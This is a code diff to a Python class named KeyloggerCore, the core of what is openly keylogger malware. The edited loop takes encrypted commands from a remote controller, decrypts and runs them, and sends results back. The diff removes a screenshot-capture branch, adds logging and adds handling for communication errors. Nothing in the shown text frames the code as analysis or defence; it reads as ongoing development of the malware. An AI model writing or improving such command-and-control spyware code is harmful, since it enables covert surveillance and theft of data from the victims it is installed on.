@@ -134,26 +134,23 @@ class KeyloggerCore:
                 if not all(k in cmd for k in ('id', 'command', 'type')):
                     raise CommandError(f"Invalid command structure: {cmd}")
     
+                logging.info("Starting decryption")
                 decrypted = self.encryption.decrypt(cmd['command'])
+                logging.info("Decryption successful")
                 logging.info(f"Decrypted command: {decrypted}")
                 command_data = json.loads(decrypted)
                 logging.info(f"Parsed command data: {command_data}")
-                logging.info(f"Command received - Type: {command_data['type']}, Params: {command_data.get('params')}")
     
                 if 'type' not in command_data:
                     raise CommandError(f"Missing 'type' in decrypted command: {command_data}")
     
-                if command_data['type'] == 'capture_screenshot':
-                    screenshot = self._capture_screenshot()
-                    if screenshot:
-                        result = {"screenshot": base64.b64encode(screenshot).decode()}
-                    else:
-                        raise CommandError("Failed to capture screenshot")
-                else:
-                    result = CommandHandler.execute(
-                        command_data['type'],
-                        command_data.get('params', {})
-                    )
+                logging.info(f"Command received - Type: {command_data['type']}, Params: {command_data.get('params', {})}")
+                
+                result = CommandHandler.execute(
+                    command_data['type'],
+                    command_data.get('params', {})
+                )
+                
                 logging.info(f"Command executed successfully: {command_data['type']}, Result: {result}")
                 self.communicator.send_command_result(cmd['id'], result)
     
@@ -161,9 +158,10 @@ class KeyloggerCore:
                 self._handle_error(f"Invalid command format: {str(e)}, Command: {cmd}")
             except CommandError as e:
                 self._handle_error(f"Command error: {str(e)}, Command: {cmd}")
+            except CommunicationError as e:
+                self._handle_error(f"Communication error: {str(e)}, Command: {cmd}")
             except Exception as e:
-                self._handle_error(f"Command execution failed: {str(e)}, Command: {cmd}")
-
+                self._handle_error(f"Command execution failed: {str(e)}, Command: {cmd}")       
     def _handle_error(self, message):
         logging.error(message)
 
